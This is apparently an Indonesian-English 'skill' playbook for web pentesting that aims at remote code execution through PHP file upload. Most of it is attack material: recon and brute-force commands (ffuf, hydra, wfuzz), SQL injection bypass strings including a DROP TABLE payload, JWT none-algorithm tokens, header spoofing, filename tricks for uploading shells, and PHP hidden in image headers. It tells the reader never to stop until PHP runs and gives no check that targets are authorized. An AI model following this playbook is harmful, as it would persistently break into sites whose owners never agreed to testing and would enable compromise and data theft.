# Pentest Skill: File Upload RCE

## Target Selection
- **SKIP IF WORDPRESS** → auto reject, buang waktu
- Quick fingerprint: technology stack, CMS detection
- Jika WordPress terdeteksi → STOP, cari target lain

---

## CRITICAL RULE
```
⚠️ JANGAN BERHENTI sampai file upload PHP berhasil!

Jika method A gagal → coba method B
Jika endpoint X tidak bisa → cari endpoint Y
Jika bypass filter gagal → coba technique lain

Iterasi terus menerus sampai:
- PHP file uploaded AND executed
- phpinfo() accessible
- Atau konfirmasi target secure
```

---

## Phase 1: Reconnaissance

### 1.1 Endpoint Discovery
```bash
# URL Harvesting
gau target.com | sort -u
waybackurls target.com | sort -u
katana -u target.com -d 3

# Directory Bruteforce
ffuf -u target.com/FUZZ -w wordlist.txt -mc 200,301,302,403
ffuf -u target.com/api/FUZZ -w api-wordlist.txt

# Parameter Discovery
arjun -u target.com
```

### 1.2 JavaScript Analysis
```bash
# Extract endpoints from JS
linkfinder -i target.com -o cli
secretfinder -i target.com -e

# Manual review
- Cari fetch(), axios, XMLHttpRequest calls
- Extract hidden API routes
- Check for API keys/tokens
```

### 1.3 Source Code Review
- HTML comments (<!-- -->)
- Hidden form fields
- Meta tags
- JavaScript variables
- Local storage/session storage

---

## Phase 2: Authentication Testing

### 2.1 User Enumeration
```
# Common endpoints
GET /api/users
GET /user/profile?id=1
GET /author?id=1
GET /wp-json/wp/v2/users (skip if WP)

# Error-based
- Login error: "User not found" vs "Wrong password"
- Registration: "Email already exists"
```

### 2.2 Registration/Signup Testing
```
# Open Registration
- Cari endpoint: /register, /signup, /api/register
- Register account baru

# Mass Assignment
POST /api/register
{
  "username": "test",
  "email": "test@test.com",
  "password": "pass123",
  "role": "admin",        ← tambah ini
  "is_admin": true,       ← atau ini
  "privileges": "root"    ← atau ini
}

# Parameter Pollution
?role=user&role=admin
role[]=admin

# User Escalation
PUT /api/users/1 {"role": "admin"}
PATCH /profile {"is_admin": true}
```

### 2.3 Password Attacks
```bash
# Jika user enumeration berhasil
hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

wfuzz -c -z file,passwords.txt -d "user=admin&pass=FUZZ" target.com/login

# Common patterns
- User@123
- Company@2024
- Welcome1
- Password1
```

### 2.4 Auth Bypass Techniques

#### SQL Injection
```
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
') OR ('1'='1
" OR "1"="1
1' OR '1'='1'/*
' UNION SELECT 1--
'; DROP TABLE users--
admin' UNION SELECT 1,2,3--
```

#### PHP Type Juggling
```
# Magic hashes (MD5 starts with 0e)
0e123456789012345678901234567890
240610708 = 0e462097431906509019562988736854

# Loose comparison bypass
"0e123" == "0e456" → true (both = 0)

# strcmp bypass
array() == "string" → true
strcmp(NULL, "admin") → returns 0 (success)

# SHA1 array bypass
sha1(array()) == sha1(array()) → true

# json_decode bypass
{"admin": true}
```

#### JWT/Session Manipulation
```
# Algorithm confusion
RS256 → HS256 (use public key as secret)

# Remove signature
eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.

# Payload manipulation
{"sub": "1234", "admin": true}

# None algorithm
{"alg":"none"}
```

#### HTTP Header Manipulation
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: /admin
Host: localhost
X-Admin: true
X-Custom-IP-Authorization: 127.0.0.1
```

#### Path/Parameter Tampering
```
# Case variation
/admin → /Admin → /ADMIN

# Double encoding
%252e%252e%252f

# Null bytes
/admin%00

# Path traversal
../../../admin

# Parameter pollution
?admin=1&admin=0
```

#### Error-Based Bypass
```
# Trigger 500 errors
Invalid JSON body
Oversized input
Special characters: ' " ; -- #
```

---

## Phase 3: File Upload Testing

### 3.1 Identify Upload Points
```
# Common locations
- Dashboard file upload
- Profile image upload
- Document management
- Any form with file input
- API endpoints: /upload, /api/upload, /files
```

### 3.2 PHP Extensions to Test

| Extension | Description |
|-----------|-------------|
| .php | Standard PHP |
| .php3 | Old PHP |
| .php4 | Old PHP |
| .php5 | Old PHP |
| .php7 | Modern PHP |
| .php8 | Latest PHP |
| .phtml | PHP + HTML |
| .pht | PHP shortened |
| .phps | PHP source (readable) |
| .shtml | SSI enabled |
| .shtm | SSI enabled |
| .svg | If PHP embedded |
| .cgi | CGI mode |
| .pl | Perl/PHP configured |

### 3.3 Bypass Techniques

#### Content-Type Manipulation
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/svg+xml
Content-Type: application/octet-stream
```

#### Filename Tricks
```
shell.php
shell.php5
shell.phtml
shell.pht
shell.php.jpg
shell.php%00.jpg
shell.php\x00.jpg
shell.PHP (case variation)
shell.pHp
.shell.php (hidden)
shell.php;.jpg (IIS)
shell.php::$DATA (NTFS)
shell.php (with tab: shell.php\t)
```

#### Double Extension
```
shell.php.jpg
shell.php.png
shell.jpg.php
shell.php.svg
shell.php%00.png
```

#### Path Traversal
```
../../../shell.php
....//....//shell.php
%2e%2e%2fshell.php
..%252fshell.php
```

#### Content Manipulation
```
# GIF header
GIF89a;<?php phpinfo(); ?>

# PNG header
‰PNG\r\n\x1a\n<?php phpinfo(); ?>

# JPEG SOI
ÿØÿICA<?php phpinfo(); ?>

# EXIF metadata
<?php phpinfo(); ?>
```

### 3.4 Verify Execution
```bash
# Upload file with:
Filename: shell.php
Content-Type: image/jpeg
Body: <?php phpinfo(); ?>

# Access uploaded file
curl https://target.com/uploads/shell.php

# Check response contains phpinfo output
```

---

## Phase 4: Report Generation

### Report Template
```markdown
# Pentest Report: File Upload RCE

## Target Information
- **URL**: 
- **Date**: 
- **Tester**: 

## Executive Summary
Brief description of findings.

## Finding: Unauthenticated PHP Upload (RCE)

### Description
[Explanation of vulnerability]

### Vulnerability Chain
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Reproduction Steps
1. Go to `[endpoint]`
2. Upload file with:
   - Filename: `shell.php`
   - Content-Type: `image/jpeg`
   - Body: `<?php phpinfo(); ?>`
3. Access uploaded file at `[URL]`

### Proof of Concept
**Uploaded File Content:**
```php
<?php phpinfo(); ?>
```

**Response:**
[HTTP response showing execution]

### Impact
- Remote Code Execution
- Full server compromise
- Data exfiltration
- Lateral movement

### Remediation
- Validate file extension server-side (whitelist)
- Move uploads outside webroot
- Disable PHP execution in upload directory
- Implement WAF rules
- Regular security audits

## Appendix
- Tools used
- Timeline
- Additional notes
```

---

## Tools Required

| Tool | Purpose |
|------|---------|
| ffuf | Directory bruteforce |
| gau | URL harvesting |
| katana | Web crawling |
| arjun | Parameter discovery |
| hydra | Password attacks |
| wfuzz | Fuzzing |
| curl | HTTP requests |
| Burp Suite | Proxy/intercept |
| linkfinder | JS endpoint extraction |
| secretfinder | JS secret detection |

---

## Checklist

```
□ WordPress detected? → REJECT
□ All endpoints discovered
□ JS files analyzed
□ Source code reviewed
□ User enumeration performed
□ Registration tested (mass assignment)
□ Password attacks attempted
□ Auth bypass techniques tried
□ All upload points identified
□ All extensions tested (.php, .php3-8, .phtml, .shtml, .svg, .cgi)
□ All bypass techniques tried
□ PHP execution verified
□ Report generated
```
